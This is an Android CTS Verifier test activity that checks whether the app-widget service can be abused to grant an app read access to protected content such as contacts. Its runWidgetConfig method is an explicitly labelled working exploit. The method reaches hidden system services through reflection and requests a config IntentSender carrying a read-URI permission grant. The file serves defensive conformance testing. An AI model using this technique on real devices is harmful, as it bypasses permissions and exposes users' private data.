/*
 * Copyright (C) 2016 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.android.cts.verifier.security;

import android.app.Activity;
import android.appwidget.AppWidgetManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.IntentSender;
import android.os.Bundle;
import android.os.IBinder;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.android.cts.verifier.PassFailButtons;
import com.android.cts.verifier.R;

public class AppWidgetServiceImplTest extends PassFailButtons.Activity {

    private int mWidgetId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_appwidgetserviceimpitest);
        setPassFailButtonClickListeners();
        setInfoResources(R.string.appwidgettest_title, R.string.appwidgettest_info, -1);
        Button readContacts= (Button) findViewById(R.id.readContacts);
        readContacts.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                try {
                    runWidgetConfig();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }

    @Override
    protected void onResume() {
        super.onResume();

        AppWidgetManager widgetManager = (AppWidgetManager) getSystemService(APPWIDGET_SERVICE);
        int[] appWidgetIds =
                widgetManager.getAppWidgetIds(new ComponentName(this, AppWidget.class));
        boolean haveWidget = appWidgetIds.length != 0;

        if (haveWidget) {
            mWidgetId = appWidgetIds[0];
        }

        ((TextView) findViewById(R.id.instruction1)).setText(
                haveWidget ? R.string.appwidgettest_ready : R.string.appwidgettest_instruction1);
        findViewById(R.id.readContacts).setEnabled(haveWidget);
    }

    /**
     * The actual exploit is in runWidgetConfig method below
     */
    public void runWidgetConfig() throws Exception {
        IBinder serviceBinder =
                (IBinder) Class.forName("android.os.ServiceManager")
                        .getMethod("getService", String.class).invoke(null, "appwidget");

        Object service =
                Class.forName("com.android.internal.appwidget.IAppWidgetService$Stub")
                        .getMethod("asInterface", IBinder.class).invoke(null, serviceBinder);

        IntentSender intentSender = (IntentSender) service.getClass()
                .getMethod("createAppWidgetConfigIntentSender", String.class, int.class, int.class)
                .invoke(service, getPackageName(),
                        mWidgetId, Intent.FLAG_GRANT_READ_URI_PERMISSION);

        startIntentSender(intentSender,
                new Intent().setData(WidgetConfigActivity.INTERESTING_URI), 0, 0, 0);
    }
}
